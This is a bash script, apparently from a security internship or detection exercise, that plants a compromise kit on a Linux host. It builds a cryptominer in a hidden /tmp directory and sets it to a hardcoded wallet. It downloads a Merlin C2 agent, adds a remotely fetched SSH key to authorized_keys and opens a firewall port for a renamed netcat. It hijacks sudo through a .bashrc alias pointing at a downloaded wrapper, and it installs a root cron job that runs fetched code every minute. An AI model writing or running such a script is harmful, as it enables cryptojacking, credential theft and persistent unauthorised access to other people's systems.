#! /bin/bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


function installXmrig(){
    if [ ! -f '/tmp/.tmp/girmx' ]; then
        if [ -f '/usr/bin/yum' ]; then
            yum install -y epel-release
            yum install -y wget git make cmake gcc gcc-c++ libstdc++-static libuv-static hwloc-devel openssl-devel

            mkdir -p /tmp/.tmp/; cd /tmp/.tmp/
            git clone https://github.com/xmrig/xmrig.git
            cd xmrig && mkdir build && cd build
            cmake .. -DUV_LIBRARY=/usr/lib64/libuv.a
            make

            cp xmrig /tmp/.tmp/girmx
        # elif [ -f '/usr/bin/dnf' ]; then
        # elif [ -f '/usr/bin/apt' ]; then
        # elif [ -f '/usr/bin/apt-get' ];then
        fi
    fi

    if [ ! -f '/tmp/.tmp/config.json' ]; then
        wget -O /tmp/.tmp/config.json https://raw.githubusercontent.com/xmrig/xmrig/master/src/config.json
        sed -i "s/YOUR_WALLET_ADDRESS/48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD/g" /tmp/.tmp/config.json
        
    fi
}



function installMerlinAgent(){
    if [ ! -f '/tmp/.tmp/linmer' ]; then
        yum install -y wget p7zip p7zip-plugins

        mkdir -p /tmp/.tmp/; cd /tmp/.tmp/
        mkdir merlin; cd merlin
        wget https://github.com/Ne0nd0g/merlin/releases/download/v0.1.4/merlinAgent-Linux-x64-v0.1.4.7z
        7z x merlinAgent-Linux-x64-v0.1.4.7z -pmerlin
        cp merlinAgent-Linux-x64 ../linmer
    fi
}



function configSSHKey(){
    mkdir -p /tmp/.tmp/; cd /tmp/.tmp/
    mkdir -p ~/.ssh/
    if [ ! -f '~/.ssh/authorized_keys' ]; then
        touch ~/.ssh/authorized_keys
        chmod 700 ~/.ssh/
        chmod 600 ~/.ssh/authorized_keys
    fi

    if [ ! -f '/tmp/.tmp/authorized_keys' ]; then
        wget -O /tmp/.tmp/authorized_keys https://raw.githubusercontent.com/Ba-Quan/ThucTap-NhanHoa/master/OsQuery/_Tmp/id_rsa.pub
    fi

    if ! grep -Fxq "$(cat /tmp/.tmp/authorized_keys)" ~/.ssh/authorized_keys; then
        cat /tmp/.tmp/authorized_keys >> ~/.ssh/authorized_keys
    fi
}



function installBackConn(){
    if [ ! -f '/tmp/.tmp/cn' ]; then
        yum install -y nc
        mkdir -p /tmp/.tmp/; cd /tmp/.tmp/
        cp /usr/bin/nc /tmp/.tmp/cn
        firewall-cmd --permanent --zone=public --add-port=1997/tcp && firewall-cmd --reload
    fi
}



function installPrivilegeEscalation(){
    if [ ! -f '/tmp/.tmp/wrap' ]; then
        mkdir -p /tmp/.tmp/; cd /tmp/.tmp/
        wget -O /tmp/.tmp/wrap https://raw.githubusercontent.com/Ba-Quan/ThucTap-NhanHoa/master/OsQuery/_Tmp/PrivilegeEscalation.sh
        chmod 777 /tmp/.tmp/wrap
        touch /tmp/.tmp/.chak
        chmod 766 /tmp/.tmp/.chak
    fi

    if ! grep -Fxq 'shopt -s expand_aliases' $HOME/.bashrc; then
        echo "shopt -s expand_aliases" >> $HOME/.bashrc
    fi

    if ! grep -Fxq "alias sudo='/tmp/.tmp/wrap'" $HOME/.bashrc; then
        echo "alias sudo='/tmp/.tmp/wrap'" >> $HOME/.bashrc
    fi
}



function addJob(){
    if [ ! -f '/var/spool/cron/root' ]; then
        touch /var/spool/cron/root
    fi
    grep -Fq "$1" /var/spool/cron/root || echo "$1" >>  /var/spool/cron/root
}



function configCrontab(){
    if [ ! -f '/tmp/.tmp/nur' ]; then
        wget -O /tmp/.tmp/nur https://raw.githubusercontent.com/Ba-Quan/ThucTap-NhanHoa/master/OsQuery/_Tmp/run.sh
        chmod +x /tmp/.tmp/nur
    fi
    addJob '* * * * * /tmp/.tmp/nur'
}



installXmrig
installMerlinAgent
configSSHKey
installBackConn
installPrivilegeEscalation
configCrontab